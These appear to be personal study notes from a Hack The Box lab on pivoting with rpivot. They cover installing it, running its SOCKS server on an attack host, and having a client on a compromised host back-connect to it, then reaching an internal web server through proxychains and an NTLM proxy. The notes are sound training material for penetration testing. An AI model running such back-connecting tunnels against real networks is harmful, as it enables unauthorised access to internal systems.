![[Pasted image 20260519131532.png]]
#### Cloning rpivot

```shell
3kjS@htb[/htb]$ git clone https://github.com/klsecservices/rpivot.git
```
#### Installing Python2.7

```shell
3kjS@htb[/htb]$ sudo apt-get install python2.7
```
#### Alternative Installation of Python2.7

```shell
3kjS@htb[/htb]$ curl https://pyenv.run | bash 
3kjS@htb[/htb]$ echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc 
3kjS@htb[/htb]$ echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc 
3kjS@htb[/htb]$ echo 'eval "$(pyenv init -)"' >> ~/.bashrc 
3kjS@htb[/htb]$ source ~/.bashrc 
3kjS@htb[/htb]$ pyenv install 2.7 
3kjS@htb[/htb]$ pyenv shell 2.7
```
#### Running server.py from the Attack Host

```shell
3kjS@htb[/htb]$ python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```
#### Transferring rpivot to the Target

```shell
3kjS@htb[/htb]$ scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```
#### Running client.py from Pivot Target

```shell
ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999 

Backconnecting to server 10.10.14.18 port 9999
```
#### Confirming Connection is Established

```shell
New connection from host 10.129.202.64, source port 35226
```
#### Browsing to the Target Webserver using Proxychains

```shell
proxychains firefox-esr 172.16.5.135:80
```
![[Pasted image 20260519131934.png]]
#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

```shell
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```
